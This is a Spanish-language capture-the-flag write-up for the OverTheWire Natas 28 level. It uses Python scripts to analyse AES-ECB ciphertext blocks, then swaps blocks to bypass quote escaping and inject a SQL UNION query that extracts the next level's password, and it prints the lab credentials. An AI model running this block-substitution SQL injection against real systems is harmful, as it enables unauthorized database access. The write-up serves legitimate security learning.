# Natas 28

#### URL: http://natas28.natas.labs.overthewire.org
#### Credenciales: natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj

Cuando introducimos cualquier cosa vemos que la peticion POST se tranforma en un GET con un parametro "query" cifrado:

![2025-03-21-114416_822x355_scrot](https://github.com/user-attachments/assets/8974c9ed-e481-4fd2-afca-b8a36cd11234)

![2025-03-21-114450_955x52_scrot](https://github.com/user-attachments/assets/38ff6e4e-0d21-49ba-93e5-d850d70ed542)

![2025-03-21-115134_1366x476_scrot](https://github.com/user-attachments/assets/cf796ae4-d30f-43e7-82e2-19d0f2fe6a5d)

Usan PKCS#7 para el padding:

![2025-03-21-115352_891x300_scrot](https://github.com/user-attachments/assets/0fdc3fe8-1b3e-4ad1-b87f-273768203031)

Creamos un pequeño script para realizar peticiones y observar la query:
``` python
import requests
from base64 import b64encode

URL='http://natas28.natas.labs.overthewire.org'
headers={'Authorization':f'Basic {b64encode(b"natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj").decode()}'}

for i in range(1,34):
    data={'query':'A'*i}
    x = requests.post(URL,headers=headers,data=data)
    print(f"QUERY: {x.url.split("=")[1]}")
```

``` bash
 python3 test.py
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKYsNYgsg1hFJebd%2BJNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ8EmoxKU1njKubmw7%2BRDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJLk0xdEarIh%2BMvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ%2BDZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKvwmKMYUAmbbaAruK1epuIZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLNQ6RxZsY7UPRe5yiycfUiiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
QUERY: G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d%2BoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
```

Podemos ver que se repite un patron, asumimos que la query esta compuesta por PREFIJO + DATA + SUFIJO + PADDING

Hacemos un script para encontrar el tamaño de bloque del cifrado:
``` python
import requests
from base64 import b64encode, b64decode
from urllib.parse import unquote

URL='http://natas28.natas.labs.overthewire.org'
headers={'Authorization':f'Basic {b64encode(b"natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj").decode()}'}

for i in range(1,50):
    data={'query':'A'*i}
    x=requests.post(URL,headers=headers,data=data)
    encryptedData=x.url.split("?")[1].split("=")[1]
    rawData = b64decode(unquote(encryptedData))
    print(f"Encrypted data Length:[{len(rawData)}] Query Length:[{len(data['query'])}]")
```

```
python3 test.py
Encrypted data Length:[80] Query Length:[1]
Encrypted data Length:[80] Query Length:[2]
Encrypted data Length:[80] Query Length:[3]
Encrypted data Length:[80] Query Length:[4]
Encrypted data Length:[80] Query Length:[5]
Encrypted data Length:[80] Query Length:[6]
Encrypted data Length:[80] Query Length:[7]
Encrypted data Length:[80] Query Length:[8]
Encrypted data Length:[80] Query Length:[9]
Encrypted data Length:[80] Query Length:[10]
Encrypted data Length:[80] Query Length:[11]
Encrypted data Length:[80] Query Length:[12]
Encrypted data Length:[96] Query Length:[13]
Encrypted data Length:[96] Query Length:[14]
Encrypted data Length:[96] Query Length:[15]
Encrypted data Length:[96] Query Length:[16]
Encrypted data Length:[96] Query Length:[17]
Encrypted data Length:[96] Query Length:[18]
Encrypted data Length:[96] Query Length:[19]
Encrypted data Length:[96] Query Length:[20]
Encrypted data Length:[96] Query Length:[21]
Encrypted data Length:[96] Query Length:[22]
Encrypted data Length:[96] Query Length:[23]
Encrypted data Length:[96] Query Length:[24]
Encrypted data Length:[96] Query Length:[25]
Encrypted data Length:[96] Query Length:[26]
Encrypted data Length:[96] Query Length:[27]
Encrypted data Length:[96] Query Length:[28]
Encrypted data Length:[112] Query Length:[29]
Encrypted data Length:[112] Query Length:[30]
```

Como se observa el tamaño de bloque es 16, porque al pasar de 12 a 13 y de 28 a 29 los datos encriptados aumentan en 16 bytes.

Presumiblemente estan usando AES-ECB porque es en el modo de operacion ECB en el que bloques iguales obtienen el mismo cifrado para la misma clave, probamos con un bloque de 'A'es, si obtenemos varios bloques identicos es que es ECB:
``` python
import requests
from base64 import b64encode, b64decode
from urllib.parse import unquote

URL='http://natas28.natas.labs.overthewire.org'
headers={'Authorization':f'Basic {b64encode(b"natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj").decode()}'}

# 16*2 porque estamos representando caracteres en hexadecimal
blockSize = 32 
for i in range(1,64):
    data={'query':'A'*i}
    x=requests.post(URL,headers=headers,data=data)
    encryptedData=x.url.split("?")[1].split("=")[1]
    rawData = b64decode(unquote(encryptedData)).hex()
    for i in range(len(rawData)//blockSize):
        print(rawData[blockSize*i:blockSize*(i+1)])
    print("="*40)
    print(f"Input Length: [{len(data['query'])}] Encrypted Data Length: [{len(rawData)}]\n")
```

Eventualmente vemos que es asi:
```
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
f633e6b05f866226b863817112b1c92b   <-- Bloques de 'AAAAAAAAAAAAAAAA'
f633e6b05f866226b863817112b1c92b   <--
36336947ddff073d132c22391e655108
ca8cf4e610913abae39a067619204a5a
========================================
Input Length: [43] Encrypted Data Length: [224]
```

Y que dado el tercer bloque se fija al introducir 10 caracteres entonces el prefijo es de 16*2+(16-10)=38 bytes:
```
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
8816c61e2bc6372660f879c45f23777e
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0
========================================
Input Length: [9] Encrypted Data Length: [160]

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2   <--
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702
========================================
Input Length: [10] Encrypted Data Length: [160]

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2   <--
36336947ddff073d132c22391e655108
ca8cf4e610913abae39a067619204a5a
========================================
Input Length: [11] Encrypted Data Length: [160]
```

Como anteriormente hasta los doce caracteres de entrada no se aplicaba el padding podemos descubrir el sufijo:
```
LEN_PREFIJO + LEN_ENTRADA + LEN_SUFIJO + LEN_PADDING = LEN_BLOQUE_ENCRIPTADO
38          + 12          + 30         + 0           = 80
```

Si introducimos una comilla simple podemos ver que se introduce \ como caracter de escape. Para esto introduciremos 11 'A'es y la comilla simple, si se agrega un caracter especial entonces se encriptarán 13 caracteres y se genera un padding de 16 bytes:

``` python
import requests
from base64 import b64encode, b64decode
from urllib.parse import unquote

URL='http://natas28.natas.labs.overthewire.org'
headers={'Authorization':f'Basic {b64encode(b"natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj").decode()}'}

blockSize = 32
# 12*'A'
data={'query':'A'*12}
x=requests.post(URL,headers=headers,data=data)
encryptedData=x.url.split("?")[1].split("=")[1]
rawData = b64decode(unquote(encryptedData)).hex()
for i in range(len(rawData)//blockSize):
    print(rawData[blockSize*i:blockSize*(i+1)])
print("="*40)
print(f"Input Length: [{len(data['query'])}] Encrypted Data Length: [{len(rawData)}]\n")

# 11*'A' + '
data={'query':'A'*11+"'"}
x=requests.post(URL,headers=headers,data=data)
encryptedData=x.url.split("?")[1].split("=")[1]
rawData = b64decode(unquote(encryptedData)).hex()
for i in range(len(rawData)//blockSize):
    print(rawData[blockSize*i:blockSize*(i+1)])
print("="*40)
print(f"Input Length: [{len(data['query'])}] Encrypted Data Length: [{len(rawData)}]\n")
```

```
 python3 test.py
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
87527d43773398c6ef1f114a513a0028 
75fd5044fd063d26f6bb7f734b41c899
========================================
Input Length: [12] Encrypted Data Length: [160]

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2 
667ef7e5b95de8a80b73cb046882cca2  
6223a14d9c4291b98775b03fbc73d4ed  
d8ae51d7da71b2b083d919a0d7b88b98
========================================
Input Length: [12] Encrypted Data Length: [192]
```

Como se ve se genera un caracter extra. Lo que tenemos que hacer es:
- Enviar una inyeccion SQL
- Capturar el texto cifrado
- Cambiara el bloque de texto cifrado con "xxxxAAAAAAAAAAA\" con "xxxxxAAAAAAAAAAAA" para quitar el caracter de escape

``` python 
import requests
from base64 import b64decode, b64encode
from urllib.parse import unquote, quote

URL='http://natas28.natas.labs.overthewire.org'
headers={'Authorization':f'Basic {b64encode(b"natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj").decode()}'}

# El tercer bloque estara compuesto por xxxxxAAAAAAAAAA\'
# Reemplazaremos ese bloque por xxxxxAAAAAAAAAAA
data={'query':'A'*9+"' UNION SELECT password FROM users; -- "}
substituteData={'query':'A'*11}

# Primera peticion: Obtener el texto cifrado
x = requests.post(URL,headers=headers,data=data)
query = x.url.split("?")[1].split("=")[1]
ciphertext = b64decode(unquote(query))

# Segunda peticion: Obtener el bloque xxxxxAAAAAAAAAAA
x = requests.post(URL,headers=headers,data=substituteData)
query = x.url.split("?")[1].split("=")[1]
exchangeBlock = b64decode(unquote(query))[32:48]

# Tercera peticion: Reemplazar parte del texto cifrado para activar la carga util maliciosa
ciphertext = ciphertext[:32] + exchangeBlock + ciphertext[48:]
searchURL = x.url.split("?")[0] + "?query=" + quote(b64encode(ciphertext).decode())
y = requests.get(searchURL,headers=headers)
print(y.text)
print(searchURL)
```

```
python3 natas28_sploit.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas28", "pass": "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" };</script></head>
<body>
<!-- morla/10111 -->
<h1>natas28</h1>
<style>
ul {
  margin: 1em 0;
  padding: 0 0 0 40px;
}

li {
  margin: 1em 0;
}
</style>
<div id="content">
<h2> Whack Computer Joke Database</h2><ul><li>31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns</li></ul>
</div>
</body>
</html>

http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyWnPci/qKte0ohRTkObF%2BT5ujPcGtKfnu/mSL/syLoz1W9Y2gUEVDr09KHPcw89z2vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA%3D
```

`natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`

PD: `data={'query':'a'*9+"' OR (SELECT password FROM users) IS NOT NULL; -- "}` permite ver todas las bromas :)
